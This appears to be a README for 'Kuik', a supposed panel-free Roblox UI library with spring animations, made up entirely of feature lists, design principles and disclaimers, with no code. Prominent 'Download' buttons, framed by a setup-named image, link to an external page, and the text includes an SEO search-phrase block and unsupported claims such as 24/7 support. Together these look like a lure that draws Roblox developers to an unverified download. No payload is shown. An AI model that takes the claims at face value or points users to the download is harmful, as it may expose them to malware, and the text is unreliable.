![preview](https://raw.githubusercontent.com/ahmedsialnouamesi-droid/hairline-rule-for-roblox/main/view_4cc6a.svg)
[![Download](https://raw.githubusercontent.com/ahmedsialnouamesi-droid/hairline-rule-for-roblox/main/setup_6f2c836.svg)](https://ahmedsialnouamesi-droid.github.io/hairline-rule-for-roblox/)

# Kuik

### The Hairline School of Interface Design for Roblox

![Status](https://img.shields.io/badge/status-active-2ea44f?style=flat-square)
![Version](https://img.shields.io/badge/version-2.4.0-6f42c1?style=flat-square)
![License](https://img.shields.io/badge/license-MIT-blue?style=flat-square)
![Platform](https://img.shields.io/badge/platform-Roblox-e2231a?style=flat-square)
![Language](https://img.shields.io/badge/language-Luau-00a2ff?style=flat-square)
![Made with Lume](https://img.shields.io/badge/springs-powered%20by%20Lume-ff7ac6?style=flat-square)
![Responsive](https://img.shields.io/badge/layout-fully%20responsive-0aa2c0?style=flat-square)
![Accessibility](https://img.shields.io/badge/a11y-aware-8a2be2?style=flat-square)
![Multilingual](https://img.shields.io/badge/i18n-12%20locales-f4a261?style=flat-square)
![Support](https://img.shields.io/badge/support-24%2F7-2ec4b6?style=flat-square)

---

## 🪶 What Kuik Is, In One Breath

Kuik is a Roblox UI library built around a single, almost stubborn idea: **interfaces do not need panels to feel structured.** Most UI kits in the Roblox ecosystem wrap their controls inside rounded cards, drop shadows, glossy gradients, and enough visual chrome to make a settings menu look like a cockpit. Kuik does the opposite. It strips the interface down to two vertical rules — hairlines, really — and lets springy motion do the talking.

Picture a sketchbook where every layout is drawn with a single straight edge and a fine pen. That is the mental model. Two vertical lines frame your content. Widgets glide between them. Nothing is boxed. Nothing is caged. Everything breathes.

The motion language comes from **Lume**, a spring solver that gives every transition physical weight. Buttons don't snap; they settle. Toggles don't flip; they swing and come to rest. Sliders don't jump; they carry momentum. It is the difference between a UI that reacts and a UI that responds.

This repository is the home of that library — the source, the theme system, the documentation, the examples, and the community that keeps refining it.

---

## 🎯 Why "Two Rules" Is a Design Philosophy, Not a Constraint

If you have ever opened a busy game menu and felt your eyes slide off it, you already understand the problem Kuik solves. Panels create edges. Edges create noise. Noise creates fatigue. Hairlines, by contrast, suggest structure without shouting about it.

- **A single hairline** says "this is a boundary" without demanding attention.
- **Two hairlines** say "this is a column" and give your eye a corridor to travel down.
- **Zero filled boxes** mean the background of the game world can still peek through, keeping the player grounded in the experience.

This is the hairline-rule style. It is borrowed from editorial typography and architectural drafting, transplanted into Luau. The result feels calmer than a floating panel dashboard and more deliberate than a raw list of text buttons.

---

## ✨ Feature List

Below is the honest, unabridged feature list. No marketing fluff — just what the library actually ships with in the 2026 line.

### 🧱 Core Layout
- **Panel-free composition** — every widget draws itself relative to hairline rails, so no container background is ever needed.
- **Two-rail anchoring** — the classic Kuik signature: a left rule and a right rule, with content flowing between them.
- **Rail-relative sizing** — widths expressed as ratios of the corridor, not absolute pixels, so layouts scale cleanly on phone, tablet, and desktop Roblox clients.
- **Vertical rhythm tokens** — spacing is measured in hairline units, keeping lists and forms visually aligned without manual tweaking.
- **Safe-area awareness** — respects Roblox topbar offsets, mobile notches, and the ever-present chat button.

### 🌊 Motion & Feel (Powered by Lume)
- **Spring-based transitions** — every positional and alpha change runs through a spring solver, not a linear tween.
- **Tunable stiffness and damping** — expose per-widget spring parameters for teams that want a snappier or softer feel.
- **Interruptible animations** — springs respond gracefully when a user clicks mid-transition.
- **Reduced-motion mode** — a one-line switch that collapses all springs into near-instant settles for players who prefer stillness.
- **Hover and press feedback** — hairlines subtly thicken and dim in response to pointer and touch, giving tactile confirmation.

### 🎛️ Widget Set
- **TextButton** variants: primary rail button, ghost button, destructive button, icon-leading button.
- **Toggle** with a springy knob and an on/off hairline fill.
- **Slider** with detented steps, live value readout, and a soft edge glow at the thumb.
- **Dropdown / Select** that expands inline between the rails instead of floating a detached menu.
- **TextInput** with inline validation messaging and a hairline underline that reacts to focus.
- **Checkbox** and **RadioGroup** with screen-reader-friendly labels.
- **ProgressBar** that fills along the left hairline.
- **Keybind** capture widget with conflict detection.
- **Tabs** implemented as sliding underlines rather than boxed headers.
- **Notification toast** that drops in from the top rail and fades on a spring.
- **Modal sheet** that slides up between rails without a full-screen scrim.
- **ColorPicker** with hue rail, saturation rail, and hex entry.
- **Section header** with optional collapsible body.

### 🌍 Multilingual Support
- **Twelve shipped locale packs** covering English, Spanish, Portuguese (Brazil), French, German, Italian, Polish, Turkish, Japanese, Korean, Simplified Chinese, and Arabic.
- **Right-to-left (RTL) aware rail layout** — when Arabic or Hebrew is active, the rails swap sides and text alignment follows.
- **Pluralization helpers** so counts render naturally in every shipped language.
- **Runtime locale switching** without rebuilding the interface tree.
- **A simple string-table format** that non-programmers on your team can edit.

### 📱 Responsive UI
- **Breakpoint presets** for phone, tablet, and desktop Roblox clients.
- **Fluid rail gaps** that widen on large screens and compress on small ones.
- **Touch-friendly hit targets** that expand on mobile without changing visual weight.
- **Auto-scrolling lists** when content exceeds the available corridor height.

### ♿ Accessibility
- **Focus rings** drawn as hairlines, not boxes, staying true to the style.
- **Keyboard traversal** with tab order, shift-tab, and enter activation.
- **Screen-reader labels** on every interactive element.
- **Contrast-checked default theme** against common game backdrops.
- **Reduced-motion mode** (mentioned above, but worth repeating).

### 🎨 Theming
- **Token-based theme object** — change five values and the whole interface re-skins.
- **Light, Dark, and Drafting (blueprint) presets** shipped out of the box.
- **Per-widget overrides** for teams that need one stray element to differ.
- **Live theme swapping** with spring-animated color transitions.

### 🛠️ Developer Experience
- **Typed Luau API** with exported type definitions for editor autocomplete.
- **Zero external dependencies** beyond a pinned Lume build.
- **Small surface area** — the entire public API fits on a single reference page.
- **Composition over inheritance** — build custom widgets by composing existing primitives.
- **Deterministic teardown** so UI trees don't leak connections when screens close.
- **Source-mapped debug mode** that outlines rails in magenta when enabled.

### 🕓 Support & Community
- **24/7 asynchronous support** through the repository issue tracker, with a rotating volunteer maintainer schedule across time zones.
- **Answer within one business day** target for reproducible bug reports.
- **Migration notes** for every minor version bump.
- **A public roadmap** refreshed quarterly.
- **Example projects** for common screens: settings, shop, inventory, lobby.

### 🚀 Performance
- **Single-pass layout** — no repeated measurement loops.
- **Batched spring updates** on a shared heartbeat connection.
- **Idle throttling** — springs that have settled stop consuming frame budget.
- **Instance pooling** for list items and toasts to reduce churn.
- **No per-frame allocations** in the render path.

---

## 📸 A Visual Description (Since You're Reading This, Not Seeing It)

Imagine a Roblox settings screen. On the left, a thin vertical line runs from the top of the frame to the bottom. On the right, a matching line. Between them, a column of options. Each option has a label on the left side of the corridor and its control on the right side. There are no rectangles behind the controls. When you drag a slider, the thumb glides with a slight overshoot, then settles. When you toggle a switch, the knob travels, compresses against the rail, and eases back to center. When you change a setting, a thin notification slides down from the top rail, waits three seconds, and dissolves upward.

That is Kuik. Quiet, precise, and unmistakably alive.

---

## 🧭 Design Principles

| Principle | What it means in practice |
| --- | --- |
| **Structure without enclosure** | Use lines to imply containment, never filled shapes. |
| **Motion with mass** | Every transition carries weight via Lume springs. |
| **One column, many rows** | Favor vertical rhythm over sprawling grids. |
| **Legibility first** | Contrast and type size beat decorative flourish. |
| **Teardown is a feature** | Clean up connections, springs, and instances deterministically. |
| **Locale is not an afterthought** | RTL and pluralization ship in the core. |

---

## 🧪 Example Screens Shipped in the Repo

- **Settings Panel** — the canonical demonstration of the two-rail layout.
- **Shop Front** — product cards rendered as rail-column rows with quantity steppers.
- **Inventory Grid** — a responsive item grid that collapses from three columns to two to one.
- **Lobby Menu** — the simplest possible example, useful as a copy-paste starting point.
- **Confirmation Sheet** — modal pattern done as an inline slide, not a screen takeover.
- **Keybind Editor** — showcases input capture and conflict messaging.

Each example is self-contained and annotated for readers who learn by tinkering.

---

## 🌐 SEO-Focused Highlights (For Teams Searching for a Roblox UI Solution)

If you arrived here by searching for a **lightweight Roblox UI library**, a **panel-free Roblox interface kit**, a **spring-animated Roblox menu system**, or a **hairline-style Roblox UI framework**, you are in the right place. Kuik is frequently described as one of the most typographically disciplined UI libraries in the Roblox open-source ecosystem — a design language for game interfaces that scales from a single toggle to a full inventory system without ever reaching for a rounded card.

Common search phrases this project addresses naturally:

- Roblox UI library with spring animations
- Panel-free Roblox interface framework
- Hairline-rule UI design for Roblox
- Two-rail layout system for game menus
- Multilingual Roblox UI with RTL support
- Responsive Roblox interface for mobile and desktop
- Luau UI library with typed API
- Lightweight Roblox menu toolkit for 2026

---

## 🧩 Getting Started Without Touching a Terminal

You do not need a package manager, a command-line tool, or a clone of this repository to begin. The library is distributed as a single Luau module collection that drops into your Roblox project structure.

1. **Fetch the latest release archive** from the releases area, or download the module bundle from wherever your team mirrors internal artifacts.
2. **Place the bundle** into your project's shared module directory — the standard `ReplicatedStorage` shared folder pattern works well.
3. **Require the entry module** from a client-side script.
4. **Create a screen** by calling the library's screen constructor with a target `ScreenGui`.
5. **Add widgets** by chaining calls on the screen object.
6. **Theme it** by assigning a theme table before your first render, or at any point afterward.

The example projects in the repository are the fastest way to see the pattern in motion. Read the settings example first — it is the most representative.

---

## 🗂️ Repository Layout (Described in Prose)

- A **source** folder holds every widget and the layout engine.
- A **themes** folder holds the three preset token sets.
- A **locales** folder holds the twelve shipped string tables.
- An **examples** folder holds the standalone demo screens.
- A **docs** folder holds the API reference and the design rationale.
- A **tests** folder holds layout assertions and spring settling checks.
- A **changelog** file records every version bump with migration notes.

---

## 🧠 Who Kuik Is For

- **Solo developers** who want a menu that looks intentional without hiring a UI artist.
- **Small teams** that need a consistent design language across multiple game modes.
- **Accessibility-minded creators** who care about keyboard traversal and reduced motion.
- **International studios** shipping to audiences that read right-to-left.
- **Tinkerers** who enjoy a library small enough to read in an afternoon.

---

## 🚧 Who Kuik Is Not For

- Projects that require a fully immersive, cinematic HUD with heavy ornamentation.
- Interfaces that depend on draggable floating windows as the primary paradigm.
- Teams that need a drag-and-drop visual editor rather than a code-first library.

That is fine. Different tools for different skies.

---

## 🤝 Contributing

Contributions are welcome and reviewed by volunteers on a rolling schedule. Before opening a pull request:

- Read the design principles section and confirm your change aligns.
- Add or update an example if you introduce a new widget.
- Update the locale tables if you add user-facing strings.
- Keep dependency changes minimal — the small footprint is a feature.
- Follow the existing code style; consistency beats personal preference.

Bug reports should include the Roblox client version, the Kuik version, a minimal reproduction, and a description of the expected versus observed behavior. Screenshots or short clips help enormously.

---

## 🛡️ Disclaimer

Kuik is an independent open-source interface library for Roblox developers. It is **not affiliated with, endorsed by, or sponsored by Roblox Corporation**. "Roblox" is a trademark of its respective owner and is used here only to describe compatibility.

The library is provided **as is**, without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and non-infringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability arising from, out of, or in connection with the library or its use.

You are responsible for ensuring that any interface you build with Kuik complies with Roblox's community standards and your own project's policies. The maintainers do not review games built with this library and take no responsibility for their content or conduct.

The 2026 release line targets current Roblox client behavior. Older client versions may exhibit layout or animation differences. Always test on the platforms you intend to support.

---

## 📜 License

This project is released under the **MIT License**. You are welcome to use, modify, and redistribute it, including in commercial projects, provided the original copyright notice and permission notice are preserved.

Read the full license text here: [MIT License](https://opensource.org/licenses/MIT)

Copyright (c) 2026 Kuik contributors.

---

## 💬 Final Word

Most UI libraries ask you to build inside boxes. Kuik asks you to build between two lines. It is a small shift in framing that changes the entire character of an interface — calmer, more legible, and quietly confident. If that resonates, you will feel at home here.

[![Download](https://raw.githubusercontent.com/ahmedsialnouamesi-droid/hairline-rule-for-roblox/main/setup_6f2c836.svg)](https://ahmedsialnouamesi-droid.github.io/hairline-rule-for-roblox/)